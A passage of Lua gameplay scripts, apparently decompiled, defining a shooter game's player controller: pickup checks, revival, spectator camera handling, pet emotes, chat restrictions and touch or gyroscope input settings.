    bIsPureAI = bIsPureAI,
    SubTypeInfoList = SubTypeInfoList
  }
  EventSystem:postEvent(EVENTTYPE_INGAME_REPLAY, EVENTID_PERIOD_UPDATE, tNewPeriodInfo)
end

PlayerControllerBase.ClientRPC.RPC_Client_PostTGPAIS = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int,
    UEnums.EPropertyClass.Str
  }
}

function PlayerControllerBase:RPC_Client_PostTGPAIS(nKey, sValue)
  local TApmHelper = import("TApmHelper")
  if TApmHelper and TApmHelper.PostGameStatusToTGPAIS and nKey and sValue then
    TApmHelper.PostGameStatusToTGPAIS(nKey, sValue)
  end
end

function PlayerControllerBase:CanPickUpItem(DefineID)
  local EPickUpCheckResult = import("EPickUpCheckResult")
  if DefineID.Type == 1 then
    local uCurPawn = self:GetCurPawn()
    if slua.isValid(uCurPawn) and uCurPawn.GetWeaponManager ~= nil then
      local uWeaponMgr = uCurPawn:GetWeaponManager()
      if slua.isValid(uWeaponMgr) and not uWeaponMgr.bClientHasFinishedHandleSpawnWeapon then
        return EPickUpCheckResult.EPUFR_DelayAdd
      end
    end
  end
  return EPickUpCheckResult.EPUFR_OK
end

function PlayerControllerBase:DealWithPickUpFailed(DefineID)
  if CGameMode and slua.isValid(CGameMode.PlayerRespawnComponent) then
    CGameMode.PlayerRespawnComponent:PlayerDelayAddItem(self.PlayerKey, DefineID.TypeSpecificID)
  end
end

function PlayerControllerBase:OverrideAvatarInfo(tPlayerInfo)
end

function PlayerControllerBase:HandlePlayerEnterFighting()
  self:DestroyFlyDeviceAnimCache()
end

function PlayerControllerBase:DestroyFlyDeviceAnimCache()
  local uCharacter = self:GetPlayerCharacterSafety()
  local ASTExtraPlayerController = import("/Script/ShadowTrackerExtra.STExtraPlayerController")
  local GameLuaAPI = import("/Script/ShadowTrackerExtra.GameLuaAPI")
  if slua.isValid(uCharacter) then
    local Controller = uCharacter:GetPlayerControllerSafety()
    if not slua.isValid(Controller) or not GameLuaAPI.IsClassOf(Controller, ASTExtraPlayerController) then
      return
    end
    Controller:SetParachuteAnimCached(2, false)
  elseif self:IsSpectator() then
    local SpectatorPawn = self:GetCurPawn()
    if not slua.isValid(SpectatorPawn) then
      return
    end
    local Controller = SpectatorPawn:GetPlayerControllerSafety()
    if not slua.isValid(Controller) or not GameLuaAPI.IsClassOf(Controller, ASTExtraPlayerController) then
      return
    end
    Controller:SetParachuteAnimCached(2, false)
  end
end

function PlayerControllerBase:HandleOnPlayerKilledOthersPlayer(FatalDamageParameter)
  if FatalDamageParameter.causerKey == self.PlayerKey then
    local MyHUD = self:GetHUD()
    local IsDying = FatalDamageParameter.ResultHealthStatus == 1 and FatalDamageParameter.PreviousHealthStatus == 0
    local IsDeath = FatalDamageParameter.ResultHealthStatus == 2
    MyHUD:PlayFatalDamageSound(IsDying, IsDeath)
  end
  local EFatalDamageRelationShip = import("EFatalDamageRelationShip")
  if FatalDamageParameter.Relationship == EFatalDamageRelationShip.MyTeamateIsCauser then
    local ScriptGameplayStatics = import("ScriptGameplayStatics")
    local uPlayerCharacter = ScriptGameplayStatics.GetCharacterByPlayerKey(self, FatalDamageParameter.causerKey)
    if slua.isValid(uPlayerCharacter) and slua.isValid(uPlayerCharacter.CharacterAvatarComp2_BP) then
      local EAvatarSlotType = import("EAvatarSlotType")
      uPlayerCharacter.CharacterAvatarComp2_BP:SetMeshVisibleByID(EAvatarSlotType.EAvatarSlotType_FootEffectEquipemtSlot, true, false, true)
    end
  end
  if self.CanModPlayActorVoiceFeature then
    local ECharacterHealthStatus = import("ECharacterHealthStatus")
    local CanPlay = FatalDamageParameter.ResultHealthStatus == ECharacterHealthStatus.FinishedLastBreath and FatalDamageParameter.causerKey == self.PlayerKey and FatalDamageParameter.Relationship ~= EFatalDamageRelationShip.MyTeammateIsCauserAndVictim
    if not CanPlay then
      return
    end
    local voiceKey
    if LobbySystem.CheckOpen(BP_EUNM_NEW_ACTOR_VOICE_FEATURES_SWITCH_V2) then
      local SettingConfig = slua_GameFrontendHUD:GetUserSettings()
      local PlayerFeatureVoiceCfg = SettingConfig.PlayerFeatureVoiceCfg
      if not PlayerFeatureVoiceCfg then
        return
      end
      local SettingValue = PlayerFeatureVoiceCfg:Get("SelfKillOthers")
      if not SettingValue then
        return
      end
      local StringUtil = require("common.string_util")
      local VoiceKeyList = StringUtil.Split(SettingValue, "|")
      if VoiceKeyList and next(VoiceKeyList) then
        voiceKey = tonumber(VoiceKeyList[math.random(#VoiceKeyList)])
      end
    elseif LobbySystem.CheckOpen(BP_EUNM_NEW_ACTOR_VOICE_FEATURES_SWITCH) then
      local SettingModule = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.SettingModule)
      local ActorVoiceSystem = require("client.slua.logic.actor_voice.logic_actor_voice")
      local SettingValue = SettingModule:GetOptionValue("PlayerChatActorID")
      if not SettingValue or not ActorVoiceSystem.CheckIsActorValid(SettingValue) then
        return
      end
      local ActorFeatureData = CDataTable.GetTableData("ActorVoiceFeatures", SettingValue)
      if not ActorFeatureData then
        return
      end
      voiceKey = ActorFeatureData.SelfKillOthersVoiceID
    end
    if voiceKey then
      self:SendStringMsg("", voiceKey, 0, "", 0, 0, true, false, false)
    end
  end
end

function PlayerControllerBase:RPC_Client_MaliciousTeammateReceiveWarningTips()
  local ClientQuickReportMaliciousTeammate = require("GameLua.Mod.BaseMod.Client.Security.ClientQuickReportMaliciousTeammate")
  if not ClientQuickReportMaliciousTeammate then
    return
  end
  ClientQuickReportMaliciousTeammate.MaliciousTeammateReceiveWarningTips()
end

function PlayerControllerBase:RPC_Client_MaliciousTeammateVictimReceiveTips(sTeammateUID, bIsForbidPickupRevokable, nVictimHealthStatus)
  local ClientQuickReportMaliciousTeammate = require("GameLua.Mod.BaseMod.Client.Security.ClientQuickReportMaliciousTeammate")
  if not ClientQuickReportMaliciousTeammate then
    return
  end
  ClientQuickReportMaliciousTeammate.MaliciousTeammateVictimReceiveTips(sTeammateUID, bIsForbidPickupRevokable, nVictimHealthStatus)
end

function PlayerControllerBase:RPC_Client_PopupAFKWindow(IsWarning, ShouldClose)
  local IngameTipsTools = require("GameLua.Mod.BaseMod.Common.UI.InGameTipsTools")
  if ShouldClose then
    IngameTipsTools.HideAllMsgBox()
  elseif IsWarning then
    IngameTipsTools.HideAllMsgBox()
    IngameTipsTools.ShowMsgBox(1, LocUtil.GetLocalizeResStr(612401041), LocUtil.GetLocalizeResStr(612401042), function()
    end)
  else
    IngameTipsTools.HideAllMsgBox()
    IngameTipsTools.ShowMsgBox(1, LocUtil.GetLocalizeResStr(612401043), LocUtil.GetLocalizeResStr(612401044), function()
    end)
  end
end

function PlayerControllerBase:IsRevivalMode()
  local bIsRevival = self:TeammateCanRevival()
  if not bIsRevival then
    bIsRevival = self.Super:IsRevivalMode()
  end
  return bIsRevival
end

function PlayerControllerBase:TeammateCanRevival()
  local uPlayerState = self.PlayerState
  if slua.isValid(uPlayerState) and uPlayerState.GetTeamMatePlayerStateList then
    local tTeammate = uPlayerState:GetTeamMatePlayerStateList({}, false)
    for _, uTeamPlayerState in pairs(tTeammate) do
      if slua.isValid(uTeamPlayerState) and uTeamPlayerState.HasAnyReviveChance and uTeamPlayerState:HasAnyReviveChance() then
        return true
      end
    end
  end
  return false
end

function PlayerControllerBase:CanBePickUpByItemID(DefineID)
  if CGameState and slua.isValid(CGameState) and CGameState.ReviveState then
    local ItemId = CGameState.ReviveState:GetConfigSelfReviveItemId()
    if DefineID.TypeSpecificID ~= ItemId then
      return self.Super:CanBePickUpByItemID(DefineID)
    end
    local ItemLimitedTime = CGameState.ReviveState:GetConfigItemLimitedTime()
    if ItemLimitedTime < CGameState:GetServerWorldTimeSeconds() then
      return false
    end
  end
  local uPlayerState = self.PlayerState
  if uPlayerState and uPlayerState.ReviveStateFeature and uPlayerState.ReviveStateFeature:GetUseSinglePlayerReviveItem() == true then
    return false
  end
  return self.Super:CanBePickUpByItemID(DefineID)
end

function PlayerControllerBase:GetLastestViewPlayerKey()
  return self.LastestViewPlayerKey or 0
end

function PlayerControllerBase:HandlePlayerExitGame(ParamState, ParamReason)
  local uPlayerState = self.PlayerState
  if uPlayerState and slua.isValid(uPlayerState) then
    local bIsAlive = uPlayerState:IsAlive()
    local HasChance = false
    if uPlayerState.HasAnyReviveChance then
      HasChance = uPlayerState:HasAnyReviveChance()
    end
    if bIsAlive or HasChance then
      local DSAITLogSubsystem = SubsystemMgr:Get("DSAITLogSubsystem")
      if DSAITLogSubsystem and DSAITLogSubsystem.HandlePlayerStateChanged then
        DSAITLogSubsystem:HandlePlayerStateChanged(nil, nil, uPlayerState.UID, ParamState, nil, bIsAlive, ParamReason)
      end
    end
    if not bIsAlive then
      if uPlayerState.ClearAllReviveCounts then
        uPlayerState:ClearAllReviveCounts()
      end
      if uPlayerState.IsInWaittingRevivalState ~= nil then
        uPlayerState.IsInWaittingRevivalState = false
      end
      if uPlayerState.bHasSendBattleResult ~= nil and uPlayerState.bHasSendBattleResult == false then
        local GameMode = UGameplayStatics.GetGameMode(self)
        Game:CheckSendBattleResult(GameMode, uPlayerState, false)
      end
    end
  else
    if bWriteLog then
      tostring(uPlayerState)
    end
  end
end

function PlayerControllerBase:HandleViewingTargetChanged(NewViewTarget)
  self:TurnOffViewingPawnOptimizationByVision()
  self:UpdateSpectatorMoveLODOptimize(NewViewTarget)
end

function PlayerControllerBase:UpdateSpectatorMoveLODOptimize(NewViewTarget)
  local ViewTarget = NewViewTarget
  if ViewTarget == nil and self.GetViewTarget then
    ViewTarget = self:GetViewTarget()
  end
  local bTrackingKiller = false
  if ViewTarget ~= nil and AKillerTracker ~= nil then
    local bOk, bIsKillerTracker = pcall(function()
      return Game:IsClassOf(ViewTarget, AKillerTracker)
    end)
    bTrackingKiller = bOk and bIsKillerTracker == true
  end
  local CVarName = "mv.SimulateMoveLODOptimize"
  local CurValue = USTExtraBlueprintFunctionLibrary.GetConsoleVariableIntValue(CVarName)
  local bReadCVarOK = CurValue ~= nil
  if not bReadCVarOK then
    CurValue = 1
  end
  if bTrackingKiller then
    if self.SavedMoveLODOptimizeValue == nil then
      self.SavedMoveLODOptimizeValue = CurValue
    end
    if CurValue ~= 0 then
      UKismetSystemLibrary.ExecuteConsoleCommand(self.Object, string.format("%s %d", CVarName, 0))
    end
  else
    local SavedValue = self.SavedMoveLODOptimizeValue
    if SavedValue ~= nil then
      self.SavedMoveLODOptimizeValue = nil
      if not bReadCVarOK or CurValue ~= SavedValue then
        UKismetSystemLibrary.ExecuteConsoleCommand(self.Object, string.format("%s %d", CVarName, SavedValue))
      end
    end
  end
end

function PlayerControllerBase:HandleSpectatorChange()
  self:TurnOffViewingPawnOptimizationByVision()
end

function PlayerControllerBase:TurnOffViewingPawnOptimizationByVision()
  local uPlayerPawn = self:GetCurPlayerCharacter()
  if not self:HasAuthority() then
    if slua.isValid(uPlayerPawn) and slua.isValid(uPlayerPawn.ThirdPersonCameraComponent) then
      if uPlayerPawn.ThirdPersonCameraComponent.bAbsoluteLocation then
        if uPlayerPawn.ApplyAllCompOptimizationByVision then
          uPlayerPawn:ApplyAllCompOptimizationByVision(false)
        end
        uPlayerPawn.ThirdPersonCameraComponent.bAbsoluteLocation = false
        uPlayerPawn.ThirdPersonCameraComponent.bAbsoluteRotation = false
        uPlayerPawn.ThirdPersonCameraComponent.bAbsoluteScale = false
      end
    end
    return
  end
  if slua.isValid(uPlayerPawn) then
    self.LastestViewPlayerKey = uPlayerPawn.PlayerKey or 0
    local uParentActor = uPlayerPawn:GetAttachParentActor()
    if slua.isValid(uParentActor) and Game:IsClassOf(uParentActor, PlaneCls) and self.ThePlane ~= uParentActor then
      self.ThePlane = self.Object
      self:OnRep_Plane()
    end
  end
end

function PlayerControllerBase:MarkTeammateExitTeamBeforeBoarding()
  if Client then
    return
  end
  self._bIsTeammateExitTeamBeforeBoarding = true
end

function PlayerControllerBase:IsTeammateExitTeamBeforeBoarding()
  return self._bIsTeammateExitTeamBeforeBoarding
end

function PlayerControllerBase:SwitchToTeammate(Idx)
  self:HandleSwitchToPlayerIndex(Idx)
end

function PlayerControllerBase:SwitchFreeViewInOB()
  self:IsObserver()
  self:IsDemoPlayGlobalObserver()
  if self:IsObserver() or self:IsDemoPlayGlobalObserver() then
    self:HandleEnterFreeViewInOB()
  end
end

PlayerControllerBase.ServerRPC.RPC_Server_ReqUseShareSkin = {
  Reliable = true,
  Params = {}
}
PlayerControllerBase.ClientRPC.RPC_Client_NotifyUseShareSkin = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
PlayerControllerBase.ServerRPC.RPC_Server_RealUseShareSkin = {
  Reliable = true,
  Params = {}
}

function PlayerControllerBase:RPC_Server_ReqUseShareSkin()
  self:RPC_Client_NotifyUseShareSkin(1)
end

function PlayerControllerBase:RPC_Server_RealUseShareSkin()
  return
end

function PlayerControllerBase:RPC_Client_NotifyUseShareSkin(Reason)
  EventSystem:postEvent(EVENTTYPE_INGAME_BACKPACK, EVENTID_BACKPACK_NOTIFY_USE_SHARESKIN, Reason)
end

function PlayerControllerBase:OnRep_nFriendLeftSharedSkinTimes()
  EventSystem:postEvent(EVENTTYPE_INGAME_BACKPACK, EVENTID_BACKPACK_INGAME_REFRESH_LEFT_TIMES)
end

function PlayerControllerBase:UseSharedBagSkin()
  return false
end

function PlayerControllerBase:SimulateTriggerInputAction(Key)
  if InputStateControl then
    InputStateControl.CallInputAction(Key)
  end
end

function PlayerControllerBase:TriggerInputAction(Key)
  if InputStateControl then
    InputStateControl.CallInputAction(Key)
  end
  if Client.IsWindowOB() or Client.IsWindows() then
    EventSystem:postEvent(EVENTTYPE_PCOB, EVENTID_PCOB_INPUT_KEY, Key)
  end
end

function PlayerControllerBase:HandleShowFollowEmoteUI(ShowFollowEmote)
  if self.bIsShowingFollowEmoteUI == ShowFollowEmote then
    return
  end
  self.bIsShowingFollowEmoteUI = ShowFollowEmote
  if ShowFollowEmote then
    EventSystem:postEvent(EVENTTYPE_INGAME_BASIC_SKILL_MENU_BP, EVENTID_SHOW_NORMAL_BTN, "Type_FollowEmote")
  else
    EventSystem:postEvent(EVENTTYPE_INGAME_BASIC_SKILL_MENU_BP, EVENTID_HIDE_NORMAL_BTN, "Type_FollowEmote")
  end
end

function PlayerControllerBase:HandleTouchInterfaceChanged()
  self:BindVirtualJoystickInputDelegates(true)
  self:BindVirtualJoystickTouchedStartInAreaDelegates(true)
end

function PlayerControllerBase:HandleOnSetPlane(Plane)
  if Client then
    return
  end
  local ENetRole = import("ENetRole")
  if slua.isValid(self.SpectatorComponent) and self.SpectatorComponent.GetOwnerObservers and not self:IsSpectator() then
    local ObserverList = self.SpectatorComponent:GetOwnerObservers()
    if ObserverList then
      for _, ObController in pairs(ObserverList) do
        if ObController and (ObController:IsSpectator() or ObController:IsInPetSpectator()) and ObController.ThePlane ~= Plane then
          ObController:SetCanGotoExPlane(true)
          ObController:SetPlane(Plane)
          ObController:SetCanGotoExPlane(false)
        end
      end
    end
  end
end

function PlayerControllerBase:HandleOnPlayerExitFlying()
  if Client then
    return
  end
  local PlayerCharacter = self:GetPlayerCharacterSafety()
  if not slua.isValid(PlayerCharacter) then
    return
  end
  local ENetRole = import("ENetRole")
  if slua.isValid(self.SpectatorComponent) and self.SpectatorComponent.GetOwnerObservers and not self:IsSpectator() then
    local ObserverList = self.SpectatorComponent:GetOwnerObservers()
    if ObserverList then
      for _, ObController in pairs(ObserverList) do
        if ObController and ObController:IsSpectator() then
          ObController:SetViewTargetTest(PlayerCharacter)
        end
      end
    end
  end
end

function PlayerControllerBase:HandleShowMovableEmoteUI(ShowFollowEmote)
  if self.bIsShowingMovableEmoteUI == ShowFollowEmote then
    return
  end
  self.bIsShowingMovableEmoteUI = ShowFollowEmote
end

function PlayerControllerBase:PlaySpecifiedPetAnimation(nAnimationID, bIsMiniTv, bIgnoreLevel)
  if Client then
    local ActionRow = CDataTable.GetTableData("PetActionTable", nAnimationID)
    local nMasterSkillID = 0
    if ActionRow and ActionRow.MasterSkillID and 0 < ActionRow.MasterSkillID then
      nMasterSkillID = ActionRow.MasterSkillID
    end
    local uCurPawn = self:GetCurPawn()
    if slua.isValid(uCurPawn) and slua.isValid(uCurPawn.PetComponent_BP) and slua.isValid(uCurPawn.PetComponent_BP.PetPawn) then
      local uActivePawn
      if bIsMiniTv then
        uActivePawn = uCurPawn.PetComponent_BP:GetMiniTVPawn()
      else
        uActivePawn = uCurPawn.PetComponent_BP.PetPawn
      end
      if slua.isValid(uActivePawn) and uActivePawn.bHidden then
        if uActivePawn.bInPetExhibiting then
          ShowNotice(82159)
        else
          ShowNotice(66661)
        end
        return
      end
      local uPetComp = uCurPawn.PetComponent_BP
      if 0 < nMasterSkillID and uPetComp.PlaySpecifiedPetAnimationCheck and not uPetComp:PlaySpecifiedPetAnimationCheck(uCurPawn) then
        return
      end
    end
    if ActionRow and ActionRow.PetAnimRes then
      do
        local Util = require("client.slua_ui_framework.util")
        Util.GetAssetAsync(ActionRow.PetAnimRes, function(uAnimation)
          if slua.isValid(uAnimation) then
            self:RPC_Server_PlaySpecifiedPetAnimation(nAnimationID, uAnimation.SequenceLength, nMasterSkillID, bIsMiniTv or false, bIgnoreLevel or false)
          end
        end)
      end
    end
  end
end

function PlayerControllerBase:RPC_Server_PlaySpecifiedPetAnimation(nAnimationID, AnimationLength, MasterSkillID, bIsMiniTv, bIgnoreLevel)
  local uCurPawn = self:GetCurPawn()
  if slua.isValid(uCurPawn) and slua.isValid(uCurPawn.PetComponent_BP) and nAnimationID and AnimationLength and 0 < AnimationLength then
    local PetEmoteConfig = CDataTable.GetTableData("PetActionTable", nAnimationID)
    if not PetEmoteConfig or PetEmoteConfig.CanPlayInBattle == 0 or PetEmoteConfig.CanPlayInBattle == 3 then
      return
    end
    local uActivePawn
    if bIsMiniTv then
      uActivePawn = uCurPawn.PetComponent_BP:GetMiniTVPawn()
    else
      uActivePawn = uCurPawn.PetComponent_BP.PetPawn
    end
    if slua.isValid(uActivePawn) then
      if uActivePawn.CanPlay and not uActivePawn:CanPlay() then
        return
      end
      if uActivePawn.bHidden then
        return
      end
    end
    if slua.isValid(uActivePawn) then
      do
        local EPetState = import("EPetState")
        if uActivePawn:PetHasState(EPetState.PetPlayingFeature) then
          return
        end

        local function EmoteIsUnLocked(EmoteID, bIsMiniTv)
          if not bIsMiniTv then
            local StringUtil = require("common.string_util")
            local PetID = uActivePawn.PetLevelInfo.PetId
            local PetLevel = uActivePawn.PetLevelInfo.PetLevel
            local ConfigID = 10000 * PetID + PetLevel
            local PetLevelConfig = CDataTable.GetTableData("PetLevelTable", ConfigID)
            local AllAction = StringUtil.Split(PetLevelConfig.AllAction, "|")
            if AllAction and 0 < #AllAction then
              for _, ID in pairs(AllAction) do
                if EmoteID == tonumber(ID) then
                  return true
                end
              end
            end
          elseif self.CommerFeature and self.CommerFeature.MiniTVActionIDList then
            for _, ID in pairs(self.CommerFeature.MiniTVActionIDList) do
              if EmoteID == tonumber(ID) then
                return true
              end
            end
          end
          return false
        end

        if bIgnoreLevel and self.bCanModPlayPetEmoteIgnoreLevel then
          self.bCanModPlayPetEmoteIgnoreLevel = false
        elseif not EmoteIsUnLocked(nAnimationID, bIsMiniTv) then
          return
        end
        if uActivePawn.BeforePlayAction then
          uActivePawn:BeforePlayAction(nAnimationID)
        end
        if MasterSkillID ~= nil and 0 < MasterSkillID then
          local SkillManager = uCurPawn:GetSkillManager()
          if slua.isValid(SkillManager) then
            local uSkill = SkillManager:GetSkill(MasterSkillID)
            if uSkill and uSkill:IsCDOK(SkillManager, -1) then
              uCurPawn:TriggerEntrySkillWithID(MasterSkillID, true)
            end
          end
          uActivePawn:PlayPetInteractAnimation(uCurPawn, nAnimationID, AnimationLength)
        else
          uActivePawn:PlayPetAnimation(nAnimationID, AnimationLength)
        end
      end
    end
  end
end

function PlayerControllerBase:RPC_Server_SetPetRandomAnimDisable(bDisable)
  if Client then
    return
  end
  local uCurPawn = self:GetCurPawn()
  if not slua.isValid(uCurPawn) or not slua.isValid(uCurPawn.PetComponent_BP) then
    return
  end
  local uPetPawn = uCurPawn.PetComponent_BP.PetPawn
  if slua.isValid(uPetPawn) then
    Game:SetAIBlackboardValue(uPetPawn, UEnums.EBlackBoardKeyType.Bool, "PetDisableRandomAnim", bDisable)
  end
end

function PlayerControllerBase:RPC_Server_SetGameReadyCountDown(nRemainingTime)
  slua.isValid(CGameMode)
  slua.isValid(CGameState)
  if not Client and slua.isValid(CGameMode) and slua.isValid(CGameState) and nRemainingTime then
    self:IsObserver()
    local diagnosticRoomOwner = self.bRoomOwner
    local diagnosticRoomType = CGameMode.RoomType
    if self:IsObserver() and self.bRoomOwner and CGameMode.RoomType == "match" then
      local GameModeState = CGameState:GetGameModeState() or ""
      if GameModeState == "ReadyState" then
        CGameState.MatchReadyConfirmed = true
        CGameMode:SetStateLeftTime(nRemainingTime)
      end
    end
  end
end

function PlayerControllerBase:BecomeAGhost(bGhost)
  self.Super:BecomeAGhost(bGhost)
  if self:IsGhost() then
    if self.DisableNetUpdateGroupID then
      self:DisableNetUpdateGroupID(1)
    else
    end
  elseif self.EnableNetUpdateGroupID then
    self:EnableNetUpdateGroupID(1)
  else
  end
end

function PlayerControllerBase:OnRep__bIsTeammateExitTeamBeforeBoarding()
  if self._bIsTeammateExitTeamBeforeBoarding then
    local UIInstance = UIManager.GetUI(UIManager.UI_Config_InGame.BirthIslandTips)
    if UIInstance and UIInstance.ShowEscapeNotice then
      UIInstance:ShowEscapeNotice()
    end
  end
end

function PlayerControllerBase:PerRespawnClearOtherPawn()
  if slua.isValid(self:GetPetSpectatorComp()) then
    self:GetPetSpectatorComp():PerRespawnClearOtherPawn()
  end
end

function PlayerControllerBase:CheckCanCustomChat()
  local GameplayData = require("GameLua.GameCore.Data.GameplayData")
  local uGameState = GameplayData.GetGameState()
  if uGameState and uGameState:GetDSSwitchValueFastWithCache(62) == "1" then
    if not Client and CGameMode and CGameMode.RoomType == "match" then
      self.bForbidCustomChat = true
    end
    if not Client then
      local GameMainConfig = require("GameLua.GameCore.Main.GameMainConfig")
      if GameMainConfig.IsPeakGame() then
        self.bForbidCustomChat = false
      end
      if GameMainConfig.IsNationEsports() then
        self.bForbidCustomChat = true
      end
    end
  end
  if Server and Server.IsMatchVersion and Server.IsMatchVersion() then
    self.bForbidCustomChat = true
  end
end

function PlayerControllerBase:LuaShowJoystickWidgetWithTag(Tag)
  self:ShowJoystickWidgetWithTag(Tag)
end

function PlayerControllerBase:LuaHideJoystickWidgetWithTag(Tag)
  self:ActivateTouchInterface(nil)
  self:HideJoystickWidgetWithTag(Tag)
end

function PlayerControllerBase:LuaShowJoystickWithTag(Tag)
  self:ShowJoystickWithTag(Tag)
end

function PlayerControllerBase:LuaHideJoystickWithTag(Tag)
  self:HideJoystickWithTag(Tag)
end

function PlayerControllerBase:SetAlwaysHideTouchInterface(Hide)
  if Hide then
    self:LuaHideJoystickWidgetWithTag("AlwaysHideTouchInterface")
  else
    self:LuaShowJoystickWidgetWithTag("AlwaysHideTouchInterface")
  end
end

function PlayerControllerBase:LuaShouldShowTouchInterface(bShow)
  return bShow
end

function PlayerControllerBase:NotCanShowTouchInterfaceHandle()
  return false
end

function PlayerControllerBase:PreShowTouchInterfaceCheck(show)
  return 0
end

function PlayerControllerBase:ShowTouchInterface(show, reason)
  local bRealShow = self:LuaShouldShowTouchInterface(show)
  if self.bIsJoyStickShow == bRealShow then
    return
  end
  if bRealShow then
    self.bIsJoyStickShow = true
    self:LuaShowJoystickWithTag("OutDatedMethodTag")
  else
    self.bIsJoyStickShow = false
    self:LuaHideJoystickWithTag("OutDatedMethodTag")
  end
end

function PlayerControllerBase:PostOnShowTouchInterface(bShow)
  if bShow then
    EventSystem:postEvent(EVENTTYPE_INGAME_UI, EVENTID_SHOW_JOYSTICK)
  end
end

function PlayerControllerBase:OnRep_bForbidCustomChat()
  EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_INGAME_REFRESH_FORBID_CUSTOM_CHAT, self.bForbidCustomChat)
end

function PlayerControllerBase:OnGoingToLoseJoystick()
  self:SetVirtualJoystickVisibility(false)
  self:ClearJoystick()
end

function PlayerControllerBase:CanExitFreeCamera()
  local IngameSelfieSubsystem = SubsystemMgr:Get("IngameSelfieSubsystem")
  if IngameSelfieSubsystem and IngameSelfieSubsystem.CanExitFreeCamera and not IngameSelfieSubsystem:CanExitFreeCamera() then
    log_warning(bWriteLog and "PlayerControllerBase:CanExitFreeCamera - return by IngameSelfieSubsystem")
    return false
  end
  return true
end

function PlayerControllerBase:HandleServerSpectatorChange(uViewTargetCharacter)
  if not Client and slua.isValid(uViewTargetCharacter) then
    if self.GetPetSpectatorComp then
      local PetSpectatorComp = self:GetPetSpectatorComp()
      if slua.isValid(PetSpectatorComp) and PetSpectatorComp.OnOwnerGotoSpectating then
        PetSpectatorComp:OnOwnerGotoSpectating()
      end
    end
    EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_INGAME_SERVER_SPECTATOR_CHANGE, self.Object, uViewTargetCharacter)
    if self:IsObserver() and slua.isValid(self.BackpackObserverRepActor) then
      local uPlayerController = uViewTargetCharacter:GetPlayerControllerSafety()
      if slua.isValid(uPlayerController) and uPlayerController.GetBackpackComponent then
        local uBackpackComp = uPlayerController:GetBackpackComponent()
        if slua.isValid(uBackpackComp) then
          self.BackpackObserverRepActor:RefreshAllItems(uBackpackComp)
        end
      end
    end
    local uParentActor = uViewTargetCharacter:GetAttachParentActor()
    local diagnosticPlayerName = uViewTargetCharacter.PlayerName
    Game:IsClassOf(uParentActor, PlaneCls)
    local diagnosticPlane = self.ThePlane
    if slua.isValid(uParentActor) and Game:IsClassOf(uParentActor, PlaneCls) and self.ThePlane ~= uParentActor then
      self.ThePlane = uParentActor
    end
  end
end

function PlayerControllerBase:RegistSetting()
  if not Client then
    return
  end
  local SettingModule = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.SettingModule)
  local bAutoUseMelee = SettingModule:GetOptionValue("AutoUseMelee")
  self:RPC_Server_SetAutoUseMelee(bAutoUseMelee)
  self:AddSettingOptionEvent("AutoUseMelee", function(AutoUseMelee)
    self:RPC_Server_SetAutoUseMelee(AutoUseMelee)
  end)
  local bPeekCanSprint = SettingModule:GetOptionValue("PeekToSprintSwitch")
  self.bPeekCanSprint = bPeekCanSprint
  self:AddSettingOptionEvent("PeekToSprintSwitch", function(InbPeekCanSprint)
    self.bPeekCanSprint = InbPeekCanSprint
  end)
  local nGyroscope = SettingModule:GetOptionValue("Gyroscope")
  self.UseMotionControlType = nGyroscope
  self:AddSettingOptionEvent("Gyroscope", function(InGyroscope)
    self.UseMotionControlType = InGyroscope
  end)
  local bGyroReverse = SettingModule:GetOptionValue("GyroReverse")
  self.GyroReverse = bGyroReverse
  self:AddSettingOptionEvent("GyroReverse", function(InGyroReverse)
    self.GyroReverse = InGyroReverse
  end)
  local bHoldGrenadeStateEnableGyro = SettingModule:GetOptionValue("HoldGrenadeStateEnableGyro")
  self.bHoldGrenadeStateEnableGyro = bHoldGrenadeStateEnableGyro
  self:AddSettingOptionEvent("HoldGrenadeStateEnableGyro", function(InHoldGrenadeStateEnableGyro)
    self.bHoldGrenadeStateEnableGyro = InHoldGrenadeStateEnableGyro
  end)
end

function PlayerControllerBase:RPC_Server_SetAutoUseMelee(bAutoUseMelee)
  if Client then
    return
  end
  self.bAutoEquipMelleeWeaponLanded = bAutoUseMelee
end

function PlayerControllerBase:JumpPlanDell(uCharacter)
  local bIsSpectator = self.IsSpectator and self:IsSpectator() or false
  if slua.isValid(uCharacter) then
    local EViewTargetBlendFunction = import("EViewTargetBlendFunction")
    if bIsSpectator then
      self:SetViewTargetWithBlend(uCharacter, 0.5, EViewTargetBlendFunction.VTBlend_Linear, 0, false)
      return
    end
    local Util = require("client.slua_ui_framework.util")
    Util.GetAssetAsync("/Game/BluePrints/Plane/BP_PlaneDummy.BP_PlaneDummy_C", function(Plane)
      if Plane and self.GetWorld and slua.isValid(uCharacter) then
        local PlaneClass = slua.loadClass("/Game/BluePrints/Plane/BP_PlaneDummy.BP_PlaneDummy")
        local UAIBlueprintHelperLibrary = import("AIBlueprintHelperLibrary")
        local Airplane = UAIBlueprintHelperLibrary.SpawnAIFromClass(self:GetWorld(), PlaneClass, nil, uCharacter:K2_GetActorLocation(), uCharacter:K2_GetActorRotation(), true)
        if bWriteLog then
          uCharacter:K2_GetActorLocation():ToString()
        end
        if Airplane and slua.isValid(uCharacter) then
          local MovementComponent = Airplane:GetComponentByClass(import("CharacterMovementComponent"))
          if MovementComponent ~= nil and slua.isValid(MovementComponent) then
            local EMovementMode = import("EMovementMode")
            MovementComponent:SetMovementMode(EMovementMode.MOVE_None, 0)
          end
          Airplane:SetLifeSpan(5)
        end
        self:SetViewTargetWithBlend(Airplane, 0, EViewTargetBlendFunction.VTBlend_Linear, 0, false)
        self:AddGameTimer(0.2, false, function()
          if slua.isValid(uCharacter) then
            self:SetViewTargetWithBlend(uCharacter, 0.5, EViewTargetBlendFunction.VTBlend_Linear, 0, false)
          end
        end)
      else
      end
    end)
  end
end

function PlayerControllerBase:ProcessMotionInputFailed(bIsAddPitch, OutPitch, bIsAddYaw, OutYaw)
  if not bIsAddPitch and not bIsAddYaw then
    return
  end
  local VehicleUserComp = self:GetVehicleUserComp()
  if not slua.isValid(VehicleUserComp) or not VehicleUserComp:CanUseGyro() then
    return
  end
  self:ProcessVehicleInput(OutPitch, OutYaw)
end

function PlayerControllerBase:MotionControliOS(AxisValue)
  self:MotionControlAndroid(AxisValue)
end

function PlayerControllerBase:MotionControlAndroid(AxisValue)
